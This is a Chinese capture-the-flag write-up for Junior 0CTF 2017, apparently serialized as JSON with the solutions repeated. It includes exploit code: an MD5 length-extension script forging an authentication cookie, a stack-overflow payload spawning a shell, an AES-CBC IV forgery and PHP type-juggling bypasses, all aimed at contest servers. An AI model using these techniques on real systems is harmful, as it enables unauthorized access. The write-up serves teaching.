\n\n**flag{php_is_best_language_:P}** 被这个漏洞震惊了，果然PHP是最好的语言。\n\n<p id = \"j6\"></p>\n### 6.Penetrate In 150\n\n（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面\n\n![img](/images/in-post/post-blog-jserv6.png)\n\n第一次访问会设置一个名为“hmac\"的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(\" $secret\\|$username\\|$password\")相等。\n\n#### 心路历程：\n\n1. 第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是`md5(\"$secret|admin|admin\")`，实际内容为\"be9fcfa876db5f4184e1635ce6561de7\"。\n2. 第一想法当然是尝试破解\\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得`md5(\"$secret|admin|admin\")`等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。\n3. 然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段`payload = {\"username\":\"admin\",\"password[]\":\"admin\"}`，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret\\|admin\\|Array，因此放弃了寻找php本身的漏洞。\n4. 第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5(\"$secret\\|admin\\|xxxxxxx\")，其中xxxxxx为我们可控制的password字段，不能为admin)。\n\n#### 解题思路：\n\n1. 首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,...,Yn-1)，计算过程为：\n\n   1. $H0=Hmd5(IV, Y0)$\n\n   2. $Hi = Hmd5(Hi-1, Yi)$\n\n   3. 最终有 $md5(Y) = Hn-1$\n\n      *IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210*\n\n      *Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit*\n\n![md5](/images/in-post/post-blog-jserv10.png)\n\n2. 然后了解消息填充的具体过程\n\n   在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，**并且填充必须进行，即使其位长对512求余的结果等于448**。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。\n\n   [来自百度百科的例子](https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2)\n\n3. 最后，我们分析题目条件，题目给出了**src = md5(\\$secret\\|admin\\|admin)**，我们需要构造一个**des = md5(\\$secret\\|admin\\|xxxxxx)**，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\\$secret\\|admin\\|xxxxxx)的生成过程和md5(\\$secret\\|admin\\|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时**des = Hmd5(src, des构造过程中的填充信息)**。\n\n4. python代码实现\n\n   为了实现方便，假设src的构造过程只使用了一个分组，即\\$secret长度小于43，那么des过程中的填充信息就固定为 ` '\\x80'+'\\x00'*55 +'\\x00\\x02'+'\\x00'*6 ` ，共512bit，64字节，其中'\\x00\\x02'表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则`xxxxxx = \"admin\" + \"\\x80\" + \"\\x00\" * (length+12-1) + (length+12的8字节小端表示)`\n\n```\n   import requests\n   bytearr = ['\\x00','\\x08','\\x10','\\x18','\\x20','\\x28','\\x30','\\x38','\\x40','\\x48','\\x50','\\x58','\\x60','\\x68','\\x70','\\x78','\\x80','\\x88','\\x90','\\x98','\\xa0','\\xa8','\\xb0','\\xb8','\\xc0','\\xc8','\\xd0','\\xd8','\\xe0','\\xe8','\\xf0','\\xf8',]\n   bitarr = ['\\x00','\\x01','\\x02', '\\x03', '\\x06', '\\x07', '\\x08', '\\x09', '\\x0a', '\\x0b']\n   length = 42\n   session = requests.Session()\n   for length in range(43):\n           # say origin len < 43\n           origin_len = length + 12\n           padding_len = (56 - origin_len)\n           padding = \"\\x80\" + \"\\x00\" * (padding_len-1)\n           checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + '\\x00'*6\n           hmac = padding + checksum\n           payload = {'username': 'admin', 'password': 'admin'+padding + checksum}\n           cookie = {'hmac': \"5f1b36f358a22a9abe395cba54f6d3bc\"}\n           r = session.post(\"http://202.121.178.201:8081/\", cookies=cookie, data=payload)\n           print(r.text)\n```\n\n<p id = \"j7\"></p>\n### 7.Eva 200\n\n此题出了bug，直接爆出了答案，没有认真做。\n\nFor fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}\n\n<p id = \"j8\"></p>\n### 8.babyre 100\n\n题目给出一个pyc文件[[encrypt.pyc](https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc)]，使用在线工具反编译一下[[decompyle](http://tools.bugscaner.com/decompyle/)]，得到python源文件，内容如下。\n\n```python\nfrom hashlib import md5\n \ndef md5raw(s):\n    return bytearray(md5(s).digest())\n \n \ndef xor(a, b):\n    assert len(a) == len(b)\n    return bytearray([ i ^ j for i, j in zip(a, b) ])\n \n \nflag = bytearray(raw_input('Show me your flag: '))\nassert len(flag) == 32\nfor i in range(16):\n    flag[:16] = xor(flag[:16], md5raw(flag[16:]))\n    flag[:16], flag[16:] = flag[16:], flag[:16]\n \nif flag == '\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1<\\xa9\\\\A\\xde\\xd22\\n':\n    print 'Right!'\nelse:\n    print 'Wrong!'\n```\n\n这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。\n\n![img](/images/in-post/post-blog-jserv11.png)\n\n```python\nfrom hashlib import md5\ndef md5raw(s):\n    return bytearray(md5(s).digest())  \ndef xor(a, b):\n    assert len(a) == len(b)\n    return bytearray([ i ^ j for i, j in zip(a, b) ])\nflag = bytearray('\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1<\\xa9\\\\A\\xde\\xd22\\n')\n\nfor i in range(16):\n    flag[16:] = xor(flag[16:], md5raw(flag[:16]))\n    flag[:16], flag[16:] = flag[16:], flag[:16]\n    print(flag)\n\nprint(flag)\n\n>>flag{1nt3re5tiNg_F3iste1_ciPh3R}\n```\n\n<p id = \"j9\"></p>\n### 9.encoder 200\n\n逆向题目，链接为[[encoder.zip](https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip)]，解压后一个名为encoder的可执行文件，一个加密后的flag\"KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=\"。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。\n\n![img](/images/in-post/post-blog-jserv12.png)\n\n使用IDA打开encoder进行分析。`main`函数如下，主要调用了`sub_4006D6()`这个函数\n\n![img](/images/in-post/post-blog-jserv13.png)\n\n函数`sub_4006D6()`内容如下，是主要的加密过程\n\n![img](/images/in-post/post-blog-jserv14.png)\n\n在函数`sub_4006D6()`内使用了两个数组（上图红线部分），数组内容如下。注意`byte_601080[]`第一位为`61h`是字符a，所以数组内容为`'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'`，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。\n\n![img](/images/in-post/post-blog-jserv15.png)\n\n反编译出的c代码的问题是变量名不易于理解，需要先来理解`sub_4006D6()`的主要过程。main函数中变量`s`为输入字符串的地址，变量`v6`为字符串的长度。于是可以得到`shb_4006D6()`函数中变量`a1`为字符串起始地址，`a2`为字符串长度。接下来`malloc()`函数分配空间，应该是给密文分配空间的，从`8*(len/5+1)+1`可以看出算法是分组加密，每5个字符加密出8个字符。`v7`是将输入字符的一个分组取出来，重点在到`v9[] = byte_601080[v7 & 0x1F]`也就是取`v7`的后5位去`byte_601080[]`中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。\n\n```c++\n_BYTE *__fastcall sub_4006D6(unsigned __int64 messagePtr, signed int len)\n{\n  signed int i; // [sp+14h] [bp-2Ch]@4\n  signed int j; // [sp+14h] [bp-2Ch]@9\n  signed int left_len; // [sp+18h] [bp-28h]@2\n  int v6; // [sp+1Ch] [bp-24h]@9\n  unsigned __int64 check_sum; // [sp+20h] [bp-20h]@2\n  unsigned __int64 new_message_ptr; // [sp+28h] [bp-18h]@1\n  _BYTE *group_secret; // [sp+30h] [bp-10h]@1\n  _BYTE *secret; // [sp+38h] [bp-8h]@1\n\n  secret = malloc(8 * (len / 5 + 1) + 1);\n  new_message_ptr = messagePtr;\n  group_secret = secret;\n  while ( len + messagePtr > new_message_ptr )\n  {\n    check_sum = 0LL;\n    left_len = len + messagePtr - new_message_ptr;\n    if ( left_len > 5 )\n      left_len = 5;\n    for ( i = 0; i <= 4; ++i )\n    {\n      check_sum <<= 8;\n      if ( i < left_len )\n        check_sum |= *(_BYTE *)(i + new_message_ptr);\n    }\n    v6 = dword_6010B0[left_len - 1];\n    for ( j = 7; j >= 0; --j )\n    {\n      group_secret[j] = byte_601080[check_sum & 0x1F];\n      check_sum >>= 5;\n    }\n    if ( v6 )\n      memset(&group_secret[8LL - v6], 61, v6);\n    new_message_ptr += 5LL;\n    group_secret += 8;\n  }\n  *group_secret = 0;\n  return secret;\n}\n```\n那么解密过程就是，对于密文的每8个字符的分组，去```byte_601080[]```中查询index\n\n```python\ndef decode(secret):\n    table = 'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'\n    message = [0]*40\n    string = ['']*5\n\n    for i, ch in enumerate(secret):\n        index = table.index(ch)\n        print(index)\n        start = (8-i)*5-5\n        while index!=0:\n            message[start] = index % 2\n            #print (message,start,index)\n            index >>= 1\n            start += 1\n\n    for i in range(5):\n        num = 0\n        for j in range(i*8+7, i*8-1, -1):\n            num <<= 1\n            num += message[j]\n        string[i] = chr(num)\n    print(string)\n    return string[::-1]\n\nprint(\"\".join(decode(\"KNByeN88\")+decode(\"KqslM52E\")+decode(\"1L67aYRE\")+decode(\"K1qQ2N1Q\")+decode(\"ydYlaEd\")))\n\n>>flag{d0_U_Kn0w_ba5e32:P}\n```\n\n最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64\n\n<p id = \"j10\"></p>\n### 10.seabreeze's stack 100\n\n题目内容为“nc 202.121.178.181 12321”与一个下载链接[[stack_55a49bdfcdafd0c31657649e905486a4](https://ctf.0ops.sjtu.cn/attachment/download/stack)]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容\n\n![img](/images/in-post/post-blog-jserv16.png)\n\n可以看到Shell Gotten与三个问题。执行nc指令\n\n![img](/images/in-post/post-blog-jserv17.png)\n\n需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。\n\n使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。\n\n![img](/images/in-post/post-blog-jserv18.png)\n\n还有一个没有用到的函数getshell()\n\n![img](/images/in-post/post-blog-jserv19.png)\n\n只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb\n\n![img](/images/in-post/post-blog-jserv20.png)\n\n栈溢出的原理可以参考链接[[栈溢出](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html)]\n\n```python\nfrom zio import *\nfrom pwn import *\nio = zio(('202.121.178.181', 12321 ))\nio.read_until('Do you want to get acquainted with top experts and like-minded friends in computer security?')  \nio.writeline('Yes!')  \nio.read_until('Do you want to stride forwards on the road of hacking and explore endless possibilities?')  \nio.writeline('Yes!!')\nio.read_until('Do you want to challenge world cutting-edge technology and compete with outstanding hackers?')\nio.writeline('Yes!!!')\nsuccess_addr = 0x080485cb\npayload = 'a' * 0x3fc + \"bbbb\" + p32(success_addr)\nio.writeline(payload)  \nio.interact()  \n```\n\n运行代码\n![img](/images/in-post/post-blog-jserv21.png)\n\ncd 进入 /home/.../stack 目录，cat 显示flag。\n![img](/images/in-post/post-blog-jserv22.png)\n\n## Have Idea\n\n<p id = \"j11\"></p>\n### 11.aes-duet\n\n题目描述为一个链接[[aes_duet.zip](https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip)]，解压得到一个密文和加密函数，文件如下\n\n```python\nfrom Crypto.Cipher import AES\ndef dummy_key_extend(k):\n    assert len(k) == 4\n    return k * 4\n\ndef aes_duet(plain, key):\n    # It is so safe that I use AES twice here!\n    assert len(key) == 8\n    k1 = dummy_key_extend(key[:4])\n    k2 = dummy_key_extend(key[4:])\n    c1 = AES.new(k1, AES.MODE_ECB)\n    c2 = AES.new(k2, AES.MODE_ECB)\n    return c2.encrypt(c1.encrypt(plain))\nif __name__ == '__main__':\n    with open('./secretkey', 'rb') as f:\n        key = f.read()\n    # To make life easier...\n    assert (key.encode('hex'))[0] == '0'\n    assert (key.encode('hex'))[-1] == '8'\n    \n    plain = 'I am a piece of lovely plaintext'\n    with open('ciphertext', 'wb') as f:\n        f.write(aes_duet(plain, key))\n    print \"I am a lovely flag: flag{ %s}\" % key.encode('hex')\n```\n\n思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。\n\n## 感想\n\n程序的安全性与正确性同等重要。\n\n我们在众多bug中微妙的生活着。\n\nPHP是世界上最好的语言。\n\n![img](/images/in-post/post-blog-j0serv8.gif)\n","source":"_posts/2017-12-10-jun0ctf.markdown","raw":"---\nlayout:     post\ntitle:      \"Junior 0CTF 2017 WriteUp (部分)\"\ntags:\n    - CTF\n---\n\n> “flag{php_is_best_language_:P}”\n\n## 前言\n\nSJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[[链接](/docs/in-post/Junior0ctfQuestion.zip)]\n\n[QQ Group ](#j0)|[Mystery Numbers ](#j1)|[Easy Traffic Analyze ](#j2)|[AES-server](#j3)\n[babyrsa ](#j4)|[Shatter Sha512!](#j5)|[Penetrate In ](#j6)|[Eva](#j7)\n[babyre](#j8)|[encoder ](#j9)|[seabreeze’s stack ](#j10)|[aes-duet ](#j11)\n\n## Solved\n\n<p id = \"j0\"></p>\n### 0.QQ Group 50\n\n友情送分题，加入QQ交流群送一个flag。\n\n<p id = \"j1\"></p>\n### 1.Mystery Numbers 100\n\n题目描述没有什么实质性内容。给了一个link[[numbers_f300d7d6dce847a265407e072790370d](https://ctf.0ops.sjtu.cn/attachment/download/signal.txt)]，下载得到一个文本文件，内容如下\n\n```shell\n5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239\n```\n\n因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容\n\n```shell\nZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9\n```\n应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。\n\n```python\nimport base64\ns = 'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'\na = base64.b64decode(s)\n\n>>flag{d0_y0u_kn0w_b45364_h4h4_6464_y4y4}\n```\n<p id = \"j2\"></p>\n### 2.Easy Traffic Analyze 200\n\n题目给了一个link[[flag.pcap](https://ctf.0ops.sjtu.cn/upload/flag.pcap)]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[[pcapfix](https://f00l.de/pcapfix/)]软件来修复。\n\n之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个\n\n![img](/images/in-post/post-blog-jserv8.png)\n\n选择“文件” -> \"导出对象\" -> “HTTP”将其导出，得到三个文件。\n\n![img](/images/in-post/post-blog-jserv0.png)\n\n其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。\n\n![img](/images/in-post/post-blog-j0serv1.png)\n\n将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。\n\n![img](/images/in-post/post-blog-jserv2.png)\n\n这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。\n\n![img](/images/in-post/post-blog-jserv3.png)\n\n<p id = \"j3\"></p>\n### 3.AES-server 100\n\n题目给出“nc 202.121.178.199 9999” 与一个文件[[server.py](https://ctf.0ops.sjtu.cn/attachment/download/server.py)]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。\n\n```shell\n#!/usr/bin/env python\n# coding=utf-8\n\nimport SocketServer\nfrom Crypto.Cipher import AES\n\nwith open('secretkey', 'rb') as f:\n    key = f.read()\nwith open('flag.txt') as f:\n    flag = f.read()\n\nclass handler(SocketServer.BaseRequestHandler):\n\n    def handle(self):\n        self.request.send(\"Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\\n\")\n        self.request.send(\"Please input your iv and encrypted message in hex:\\n\")\n        \n        data = self.request.recv(1024).rstrip()\n        try:\n            raw_data = data.decode('hex')\n        except Exception, e:\n            self.request.send(\"Error: {}\\n\".format(e.message))\n            self.request.close()\n            return\n\n        if len(raw_data) < 32 or len(raw_data) & 0xf:\n            self.request.send(\"Your input is not valid!\\n\")\n            self.request.close()\n            return\n        \n        iv = raw_data[:16]\n        enc = raw_data[16:]\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        plain = cipher.decrypt(enc)\n        self.request.send(\"Here is your plaintext: {}\\n\".format(repr(plain)))\n\n        if plain[:5] == 'admin':\n            self.request.send(\"hello, admin! Here is your flag: {}\".format(flag))\n        self.request.close()\n\n\nif __name__ == \"__main__\":\n    HOST, PORT = \"localhost\", 9999\n    server = SocketServer.TCPServer((HOST, PORT), handler)\n    server.serve_forever()\n```\n\n代码里显示**AES.MODE_CBC**，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图\n\n![img](/images/in-post/post-blog-jserv9.png)\n\n代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。\n\n这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。\n\n这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。\n\n![img](/images/in-post/post-blog-jserv4.png)\n\n```shell\n>>nc 202.121.178.199 9999\n>>0000000000000000000000000000000000000000000000000000000000000000\n>>python\n>>'_\\xf7;>\\xca\\xdeQ\\x16\\x96\\xe4y\\xa7\\x92\\xfc\\x9b\\xbd'.encode('hex')\n>>'admin\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00'.encode('hex')\n>>hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)\n>>exit()\n>>nc 202.121.178.199 9999\n>>3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000\n```\n\n<p id = \"j4\"></p>\n### 4.babyrsa 100\n\n题目提供了一个压缩文件[[babyrsa.zip](https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip)]，包含RAS加密的公钥，密文，现在需要求明文。\n\n首先从publicKey.pem中提取n，e\n\n```python\nfrom Crypto.PublicKey import RSA\npub = RSA.importKey(open('./publicKey.pem').read())\nn = long(pub.n)\ne = long(pub.e)\n\n>>n = 39845701744153150941069529194757526450699838667585381414738119544695931460213\n>>e = 65537\n```\n\n这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[[factordb](http://www.factordb.com)]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)\n\n![img](/images/in-post/post-blog-j0serv7.png)\n\n在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。\n\n<p id = \"j5\"></p>\n### 5.Shatter Sha512! 150\n\n题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。\n\n![img](/images/in-post/post-blog-jserv5.png)\n\n题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url\n\n```shell\n202.121.178.201：8083?x[]=1&y[]=2\n```\n\n不等条件显然成立，这里x与y都成为**Array**类型，hash值都为**Null**，于是echo $flag. \n\n**flag{php_is_best_language_:P}** 被这个漏洞震惊了，果然PHP是最好的语言。\n\n<p id = \"j6\"></p>\n### 6.Penetrate In 150\n\n（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面\n\n![img](/images/in-post/post-blog-jserv6.png)\n\n第一次访问会设置一个名为“hmac\"的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(\" $secret\\|$username\\|$password\")相等。\n\n#### 心路历程：\n\n1. 第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是`md5(\"$secret|admin|admin\")`，实际内容为\"be9fcfa876db5f4184e1635ce6561de7\"。\n2. 第一想法当然是尝试破解\\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得`md5(\"$secret|admin|admin\")`等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。\n3. 然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段`payload = {\"username\":\"admin\",\"password[]\":\"admin\"}`，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret\\|admin\\|Array，因此放弃了寻找php本身的漏洞。\n4. 第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5(\"$secret\\|admin\\|xxxxxxx\")，其中xxxxxx为我们可控制的password字段，不能为admin)。\n\n#### 解题思路：\n\n1. 首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,...,Yn-1)，计算过程为：\n\n   1. $H0=Hmd5(IV, Y0)$\n\n   2. $Hi = Hmd5(Hi-1, Yi)$\n\n   3. 最终有 $md5(Y) = Hn-1$\n\n      *IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210*\n\n      *Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit*\n\n![md5](/images/in-post/post-blog-jserv10.png)\n\n2. 然后了解消息填充的具体过程\n\n   在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，**并且填充必须进行，即使其位长对512求余的结果等于448**。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。\n\n   [来自百度百科的例子](https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2)\n\n3. 最后，我们分析题目条件，题目给出了**src = md5(\\$secret\\|admin\\|admin)**，我们需要构造一个**des = md5(\\$secret\\|admin\\|xxxxxx)**，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\\$secret\\|admin\\|xxxxxx)的生成过程和md5(\\$secret\\|admin\\|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时**des = Hmd5(src, des构造过程中的填充信息)**。\n\n4. python代码实现\n\n   为了实现方便，假设src的构造过程只使用了一个分组，即\\$secret长度小于43，那么des过程中的填充信息就固定为 ` '\\x80'+'\\x00'*55 +'\\x00\\x02'+'\\x00'*6 ` ，共512bit，64字节，其中'\\x00\\x02'表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则`xxxxxx = \"admin\" + \"\\x80\" + \"\\x00\" * (length+12-1) + (length+12的8字节小端表示)`\n\n```\n   import requests\n   bytearr = ['\\x00','\\x08','\\x10','\\x18','\\x20','\\x28','\\x30','\\x38','\\x40','\\x48','\\x50','\\x58','\\x60','\\x68','\\x70','\\x78','\\x80','\\x88','\\x90','\\x98','\\xa0','\\xa8','\\xb0','\\xb8','\\xc0','\\xc8','\\xd0','\\xd8','\\xe0','\\xe8','\\xf0','\\xf8',]\n   bitarr = ['\\x00','\\x01','\\x02', '\\x03', '\\x06', '\\x07', '\\x08', '\\x09', '\\x0a', '\\x0b']\n   length = 42\n   session = requests.Session()\n   for length in range(43):\n           # say origin len < 43\n           origin_len = length + 12\n           padding_len = (56 - origin_len)\n           padding = \"\\x80\" + \"\\x00\" * (padding_len-1)\n           checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + '\\x00'*6\n           hmac = padding + checksum\n           payload = {'username': 'admin', 'password': 'admin'+padding + checksum}\n           cookie = {'hmac': \"5f1b36f358a22a9abe395cba54f6d3bc\"}\n           r = session.post(\"http://202.121.178.201:8081/\", cookies=cookie, data=payload)\n           print(r.text)\n```\n\n<p id = \"j7\"></p>\n### 7.Eva 200\n\n此题出了bug，直接爆出了答案，没有认真做。\n\nFor fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}\n\n<p id = \"j8\"></p>\n### 8.babyre 100\n\n题目给出一个pyc文件[[encrypt.pyc](https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc)]，使用在线工具反编译一下[[decompyle](http://tools.bugscaner.com/decompyle/)]，得到python源文件，内容如下。\n\n```python\nfrom hashlib import md5\n \ndef md5raw(s):\n    return bytearray(md5(s).digest())\n \n \ndef xor(a, b):\n    assert len(a) == len(b)\n    return bytearray([ i ^ j for i, j in zip(a, b) ])\n \n \nflag = bytearray(raw_input('Show me your flag: '))\nassert len(flag) == 32\nfor i in range(16):\n    flag[:16] = xor(flag[:16], md5raw(flag[16:]))\n    flag[:16], flag[16:] = flag[16:], flag[:16]\n \nif flag == '\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1<\\xa9\\\\A\\xde\\xd22\\n':\n    print 'Right!'\nelse:\n    print 'Wrong!'\n```\n\n这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。\n\n![img](/images/in-post/post-blog-jserv11.png)\n\n```python\nfrom hashlib import md5\ndef md5raw(s):\n    return bytearray(md5(s).digest())  \ndef xor(a, b):\n    assert len(a) == len(b)\n    return bytearray([ i ^ j for i, j in zip(a, b) ])\nflag = bytearray('\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc1<\\xa9\\\\A\\xde\\xd22\\n')\n\nfor i in range(16):\n    flag[16:] = xor(flag[16:], md5raw(flag[:16]))\n    flag[:16], flag[16:] = flag[16:], flag[:16]\n    print(flag)\n\nprint(flag)\n\n>>flag{1nt3re5tiNg_F3iste1_ciPh3R}\n```\n\n<p id = \"j9\"></p>\n### 9.encoder 200\n\n逆向题目，链接为[[encoder.zip](https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip)]，解压后一个名为encoder的可执行文件，一个加密后的flag\"KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=\"。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。\n\n![img](/images/in-post/post-blog-jserv12.png)\n\n使用IDA打开encoder进行分析。`main`函数如下，主要调用了`sub_4006D6()`这个函数\n\n![img](/images/in-post/post-blog-jserv13.png)\n\n函数`sub_4006D6()`内容如下，是主要的加密过程\n\n![img](/images/in-post/post-blog-jserv14.png)\n\n在函数`sub_4006D6()`内使用了两个数组（上图红线部分），数组内容如下。注意`byte_601080[]`第一位为`61h`是字符a，所以数组内容为`'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'`，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。\n\n![img](/images/in-post/post-blog-jserv15.png)\n\n反编译出的c代码的问题是变量名不易于理解，需要先来理解`sub_4006D6()`的主要过程。main函数中变量`s`为输入字符串的地址，变量`v6`为字符串的长度。于是可以得到`shb_4006D6()`函数中变量`a1`为字符串起始地址，`a2`为字符串长度。接下来`malloc()`函数分配空间，应该是给密文分配空